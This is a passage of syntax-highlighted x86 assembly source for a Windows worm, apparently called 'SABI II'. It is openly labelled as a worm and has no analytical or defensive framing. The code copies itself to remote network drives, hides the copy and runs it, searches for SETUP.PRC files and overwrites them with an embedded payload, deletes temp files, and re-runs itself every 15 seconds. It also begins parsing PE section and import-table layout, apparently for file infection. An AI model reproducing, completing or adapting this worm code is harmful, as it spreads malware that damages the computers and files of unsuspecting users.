   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_REMOTE</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_string2</span><span class="sc0">

   </span><span class="sc1">; copy worm to remote drive and play it</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">avd_back</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">

   </span><span class="sc5">avd_back</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.2-S'</span><span class="sc0">   </span><span class="sc1">;   SABI· II</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EXE'</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CopyFileA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nxt_string2</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">f_exec</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">f_exec</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetFileAttributesA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle@010</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetStartupInfoA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle@011</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle@010</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">   </span><span class="sc1">;   NORMAL_PRIORITY_CLASS</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CreateProcessA</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">nxt_string2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@004_unl</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_string1</span><span class="sc0">

   </span><span class="sc5">worm@004_unl</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IMAGEHLP</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">

   </span><span class="sc5">worm@004_no_unl</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">worm@004</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

   </span><span class="sc5">worm@005</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

   </span><span class="sc1">; .tmp filez</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'PMT.'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">worm@005_prc</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'PMT.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_DeleteFileA</span><span class="sc0">

   </span><span class="sc5">worm@005_prc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; .prc filez</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'PLHE'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'GAMI'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_LoadLibraryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IMAGEHLP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@005_esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'liFr'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'oFee'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'rThc'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'raeS'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_SearchTreeForFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@005_unl_hlp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetWindowsDirectoryA</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@005_unl_hlp</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">worm@005_get_drv</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">std</span><span class="sc0">
   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@005_drv</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">worm@005_get_drv</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm@005_unl_hlp</span><span class="sc0">

   </span><span class="sc5">worm@005_drv</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_SetCurrentDirectoryA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'RP.P'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'UTES'</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_SearchTreeForFile</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@005_un_esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IO@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2506</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IO@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">worm@005_un_esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_palm</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2506</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">

   </span><span class="sc5">worm@005_un_esp</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc5">worm@005_unl_hlp</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IMAGEHLP</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FreeLibrary</span><span class="sc0">

   </span><span class="sc5">worm@005_esp</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">worm@005</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

   </span><span class="sc5">final</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">27</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SABi¡ II OUT FROM MEMORY !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_ExitProcess</span><span class="sc0">

   </span><span class="sc9">ELSE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_Sleep</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">worm@000</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">worm@error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">worm@error</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PROGRAM ERROR !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_ionumb@007</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">final</span><span class="sc0">

   </span><span class="sc5">set_file_mem</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@002</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FindFirstFileA</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FindClose</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_buffer@002.nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize3</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalAlloc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@011</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@012</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;  read mode</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IO@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@011</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">

   </span><span class="sc1">;  sections rva (1000h multiply)</span><span class="sc0">
   </span><span class="sc1">;  IT rva in PE + 80h (1000h multiply)</span><span class="sc0">
